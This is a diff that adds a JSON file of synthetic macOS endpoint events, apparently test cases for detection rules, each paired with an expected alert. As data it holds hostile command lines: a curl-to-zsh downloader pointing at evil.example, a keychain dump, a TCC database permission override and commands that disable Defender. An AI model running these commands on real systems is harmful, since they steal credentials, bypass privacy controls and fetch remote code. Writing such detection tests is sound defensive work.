@@ -1,0 +1,92 @@
+[
+  {
+    "use_case": "unsigned_untrusted_execution",
+    "platform": "macos",
+    "host": "MAC-ENG-022",
+    "user": "alice",
+    "process_name": "update_helper",
+    "process_path": "/Users/alice/Downloads/update_helper",
+    "parent_process_name": "osascript",
+    "process_command_line": "/Users/alice/Downloads/update_helper --silent",
+    "signature_status": "unsigned",
+    "team_id": "",
+    "quarantine_flag": true,
+    "expected_result": "ALERT — unsigned binary launched from Downloads by osascript"
+  },
+  {
+    "use_case": "launchd_persistence",
+    "platform": "macos",
+    "host": "MAC-SALES-004",
+    "user": "bob",
+    "file_path": "/Users/bob/Library/LaunchAgents/com.apple.update.plist",
+    "action": "file_create",
+    "process_name": "zsh",
+    "plist_program": "/private/tmp/safari_update",
+    "plist_run_at_load": "true",
+    "plist_keep_alive": "true",
+    "expected_result": "ALERT — LaunchAgent persists payload from user-writable path"
+  },
+  {
+    "use_case": "keychain_abuse",
+    "platform": "macos",
+    "host": "MAC-FIN-009",
+    "user": "carol",
+    "process_name": "security",
+    "process_command_line": "security dump-keychain -d login.keychain-db",
+    "parent_process_name": "python3",
+    "expected_result": "ALERT — keychain dump via security CLI"
+  },
+  {
+    "use_case": "tcc_tampering",
+    "platform": "macos",
+    "host": "MAC-MKT-010",
+    "user": "david",
+    "action": "file_modify",
+    "process_name": "sqlite3",
+    "process_command_line": "sqlite3 ~/Library/Application Support/com.apple.TCC/TCC.db 'update access set allowed=1'",
+    "file_path": "/Users/david/Library/Application Support/com.apple.TCC/TCC.db",
+    "expected_result": "ALERT — direct TCC DB modification"
+  },
+  {
+    "use_case": "osascript_abuse",
+    "platform": "macos",
+    "host": "MAC-HR-011",
+    "user": "emma",
+    "process_name": "osascript",
+    "process_command_line": "osascript -e 'do shell script \"curl -fsSL https://evil.example/p.sh | zsh\"'",
+    "parent_process_name": "Google Chrome",
+    "expected_result": "ALERT — osascript launching shell downloader"
+  },
+  {
+    "use_case": "security_tool_tampering",
+    "platform": "macos",
+    "host": "MAC-OPS-013",
+    "user": "frank",
+    "process_name": "zsh",
+    "process_command_line": "launchctl bootout system/com.microsoft.wdav && killall wdavdaemon",
+    "expected_result": "ALERT — attempt to disable Defender on macOS"
+  },
+  {
+    "use_case": "mass_file_encryption",
+    "platform": "macos",
+    "host": "MAC-DESIGN-015",
+    "user": "grace",
+    "process_name": "invoicefix",
+    "process_path": "/Users/grace/Downloads/invoicefix",
+    "file_ops": 240,
+    "unique_exts": 1,
+    "extensions": ["locked"],
+    "expected_result": "ALERT CRITICAL — mass rename/encryption behavior"
+  },
+  {
+    "use_case": "large_outbound_transfer",
+    "platform": "macos",
+    "host": "MAC-LEGAL-002",
+    "src_ip": "10.20.4.25",
+    "dest_ip": "185.220.101.25",
+    "bytes_out": 1610612736,
+    "app": "ssl",
+    "reputation": "unknown",
+    "expected_result": "ALERT HIGH — 1.5GB outbound transfer from macOS endpoint to unknown destination"
+  }
+]
